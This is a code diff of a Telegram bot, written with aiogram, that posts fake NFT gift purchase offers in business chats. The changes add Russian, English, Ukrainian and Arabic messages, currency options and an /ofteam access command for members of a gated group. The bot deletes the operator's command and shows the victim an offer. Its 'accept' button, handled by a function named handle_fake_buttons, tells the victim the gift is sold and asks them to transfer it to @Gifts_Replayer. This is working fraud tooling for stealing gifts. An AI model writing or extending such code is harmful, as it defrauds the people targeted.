@@ -2,7 +2,7 @@ import asyncio
 import os
 import re
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import CommandStart
+from aiogram.filters import CommandStart, Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.exceptions import TelegramBadRequest
 
@@ -10,15 +10,50 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# --- НАСТРОЙКИ ПОДПИСКИ ---
-TARGET_CHAT_ID = -1003747516067  # Твой ID группы
-INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6" # Ссылка на группу
+# --- НАСТРОЙКИ ---
+TARGET_CHAT_ID = -1003747516067
+INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"
+
+# Словарь с переводами
+MESSAGES = {
+    "ru": {
+        "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.",
+        "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
+        "btn_accept": "Принять",
+        "btn_decline": "Отклонить",
+        "btn_transfer": "Передать NFT"
+    },
+    "en": {
+        "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> to receive stars.",
+        "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
+        "btn_accept": "Accept",
+        "btn_decline": "Decline",
+        "btn_transfer": "Transfer NFT"
+    },
+    "ua": {
+        "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зарахування зірок.",
+        "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
+        "btn_accept": "Прийняти",
+        "btn_decline": "Відхилити",
+        "btn_transfer": "Передати NFT"
+    },
+    "ar": {
+        "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> لاستلام النجوم.",
+        "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
+        "btn_accept": "قبول",
+        "btn_decline": "رفض",
+        "btn_transfer": "نقل NFT"
+    }
+}
 
 def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
-# Функция проверки подписки
 async def is_subscribed(user_id: int) -> bool:
     try:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
@@ -27,7 +62,7 @@ async def is_subscribed(user_id: int) -> bool:
         print(f"Ошибка проверки подписки: {e}")
         return False
 
-# --- 1. ОБРАБОТКА /start С ПРОВЕРКОЙ ПОДПИСКИ ---
+# --- 1. СТАРТ И /ofteam ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     if not await is_subscribed(message.from_user.id):
@@ -40,35 +75,52 @@ async def cmd_start(message: types.Message):
             reply_markup=keyboard,
             parse_mode="HTML"
         )
-    else:
-        await message.answer(
-            "✅ <b>Вы подписаны!</b>\n\n"
-            "Этот бот предназначен для визуализации NFT-офферов в режиме автоматизации чатов.\n\n"
-            "❌ Генерация офферов в личных сообщениях недоступна.\n"
-            "✅ Чтобы увидеть оффер, дождитесь его в чате от пользователя.",
-            parse_mode="HTML"
-        )
+        return
 
-# --- 2. БЛОКИРОВКА /of ДЛЯ ОБЫЧНЫХ ПОЛЬЗОВАТЕЛЕЙ ---
+    text = (
+        "<b>Как начать:</b>\n"
+        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
+        "<b>Как создать оффер:</b>\n"
+        "Отправь команду в деловой чат с покупателем:\n"
+        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
+        "<b>Примеры:</b>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
+        "<b>Валюты:</b> stars / gram\n"
+        "<b>Языки:</b> ru / en / ua / ar"
+    )
+    await message.answer(text, parse_mode="HTML")
+
+@dp.message(Command("ofteam"))
+async def cmd_ofteam(message: types.Message):
+    if await is_subscribed(message.from_user.id):
+        await message.answer("✅ <b>Доступ выдан!</b>\nТеперь вы можете использовать команду /of в деловых чатах.")
+    else:
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
+        ])
+        await message.answer("⚠️ Вы не подписаны на группу!", reply_markup=keyboard)
+
+# --- 2. БЛОКИРОВКА /of В ЛИЧКЕ ---
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- 3. РАБОТА БОТА ТОЛЬКО В БИЗНЕС-ЧАТАХ ---
+# --- 3. СОЗДАНИЕ ОФФЕРА (В БИЗНЕС-ЧАТАХ) ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id:
         return
 
-    # Проверка подписки перед отправкой оффера
     if not await is_subscribed(message.from_user.id):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
         ])
         await bot.send_message(
             chat_id=message.chat.id,
-            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>",
+            text="⚠️ Для использования бота вы должны состоять в группе.",
             reply_markup=keyboard,
             business_connection_id=business_connection_id,
             parse_mode="HTML"
@@ -76,7 +128,8 @@ async def handle_offer_command(message: types.Message):
         return
 
     parts = message.text.split()
-    if len(parts) < 3:
+    # Проверяем: /of, ссылка, цена, валюта (минимум 4 части)
+    if len(parts) < 4:
         return
 
     link = parts[1]
@@ -84,6 +137,14 @@ async def handle_offer_command(message: types.Message):
         amount = int(parts[2])
     except ValueError:
         return
+    
+    currency = parts[3].lower()
+    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
+    
+    # Язык (если не указан, берем ru)
+    lang = parts[4].lower() if len(parts) > 4 else "ru"
+    if lang not in MESSAGES:
+        lang = "ru"
 
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match:
@@ -93,22 +154,23 @@ async def handle_offer_command(message: types.Message):
     pretty_name = get_pretty_name(gift_slug)
     username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
 
+    # Получаем текст на нужном языке
+    msg_data = MESSAGES[lang]
+    caption_text = msg_data["offer"].format(
+        username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name
+    )
+
     try:
         await bot.delete_business_messages(
             business_connection_id=business_connection_id,
             message_ids=[message.message_id]
         )
 
-        caption_text = (
-            f"Пользователь ({username})\n"
-            f"предлагает вам\n"
-            f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
-        )
-
+        # В callback_data передаем действие, слаг, сумму, валюту и язык
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
-                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
-                InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
+                InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
+                InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
             ]
         ])
 
@@ -136,17 +198,23 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         return
 
     if not await is_subscribed(callback.from_user.id):
-        await callback.answer("Вы вышли из группы! Вступите обратно, чтобы продолжить.", show_alert=True)
+        await callback.answer("Вы вышли из группы!", show_alert=True)
         return
 
+    # accept:slug:amount:currency:lang
     data_parts = callback.data.split(":")
     action = data_parts[0]
     gift_slug = data_parts[1]
     amount = data_parts[2]
+    currency = data_parts[3]
+    lang = data_parts[4]
 
+    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
+    
     link = f"https://t.me/nft/{gift_slug}"
     pretty_name = get_pretty_name(gift_slug)
     business_connection_id = callback.message.business_connection_id
+    msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
     try:
         if business_connection_id:
@@ -158,15 +226,12 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
                 pass
 
         if action == "accept":
-            new_text = (
-                f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
-                f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
-            )
+            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="Передать NFT", url="https://t.me/Gifts_Replayer")]
+                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
             ])
         else:
-            new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
+            new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
             new_keyboard = None
 
         kwargs = {
